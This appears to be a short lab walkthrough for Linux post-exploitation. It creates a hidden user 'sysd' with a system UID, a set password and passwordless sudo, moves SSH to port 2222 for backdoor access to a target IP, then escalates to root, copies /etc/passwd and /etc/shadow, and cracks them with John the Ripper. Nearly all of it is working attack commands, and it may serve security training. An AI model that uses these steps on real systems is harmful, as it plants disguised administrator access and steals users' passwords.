Step 1: Shadow People

Create a secret user named sysd. Make sure this user doesn't have a home folder created:

sudo adduser sysd


Give your secret user a password:

sudo passwd sysd
Enter new UNIX password: keytoall
Retype new UNIX password: keytoall



Give your secret user a system UID < 1000:

sudo usermod -u 600 sysd



Give your secret user the same GID:

sudo groupmod -g 600 sysd



Give your secret user full sudo access without the need for a password:

sudo visudo




Test that sudo access works without your password:

sudo -l



Step 2: Smooth Sailing

Edit the sshd_config file:

nano /etc/ssh/sshd_config



Step 3: Testing Your Configuration Update

Restart the SSH service:

service ssh restart



Exit the root account:

Exit





SSH to the target machine using your sysd account and port 2222:

ssh sysd@192.168.6.105 -p 2222




Use sudo to switch to the root user:

sudo su



Step 4: Crack All the Passwords

SSH back to the system using your sysd account and port 2222:

ssh sysd@192.168.6.105 -p 2222

Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:

Sudo -s
cp /etc/passwd password1.txt
cp /etc/shadow unshadow1.txt
unshadow password1.txt unshadow1.txt > john-input
john john-input
